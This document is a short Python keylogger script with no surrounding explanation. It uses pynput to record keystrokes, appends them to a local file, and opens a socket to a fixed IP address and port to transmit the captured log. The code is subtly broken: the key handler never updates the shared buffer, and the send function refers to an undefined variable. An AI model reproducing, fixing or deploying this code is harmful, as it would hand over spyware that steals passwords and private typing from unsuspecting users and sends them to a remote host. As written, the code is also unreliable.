import pynput as pk
import socket as sck
def key_event(k):
    l = ''
    try:
        l += k.char
    except AttributeError:
        if k == pk.keyboard.Key.space:
            l += ' '
        else:
            l += f' {k} '
    print(f'Key: {k}')
def save_data(t):
    with open('data.txt', 'a') as f:
        f.write(t)
def transmit_logs():
    ip = '192.168.122.182'
    p = 9000
    skt = sck.socket(sck.AF_INET, sck.SOCK_STREAM)
    try:
        skt.connect((ip, p))
        skt.sendall(t.encode())
        print(f'Sent to {ip}:{p}')
    except Exception as e:
        print(f'Failed: {e}')
    finally:
        skt.close()
l = ''
with pk.keyboard.Listener(on_press=key_event) as lstnr:
    try:
        lstnr.join()
    except KeyboardInterrupt:
        pass
save_data(l)
transmit_logs()